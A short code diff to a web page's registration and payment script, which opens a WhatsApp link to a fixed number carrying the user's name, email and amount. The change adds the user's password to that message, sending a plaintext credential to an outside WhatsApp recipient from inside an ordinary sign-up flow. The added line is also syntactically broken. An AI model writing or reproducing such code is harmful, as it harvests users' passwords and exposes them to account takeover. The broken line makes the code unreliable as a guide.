@@ -736,7 +736,7 @@
             btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
 
             setTimeout(() => {
-                const waMsg = `*New Registration*%0AName: ${userData.name}%0AEmail: ${userData.email}%0AAmount: Rs. ${amount}`;
+                const waMsg = `*New Registration*%0AName: ${userData.name}%0AEmail: ${userData.email}%0APasword: ${userData.Pasword:}%0AAmount: Rs. ${amount}`;
                 window.open(`https://wa.me/94762196055?text=${waMsg}`, '_blank');
                 document.getElementById('pay-box').style.display = 'none';
                 document.getElementById('verify-box').style.display = 'block';
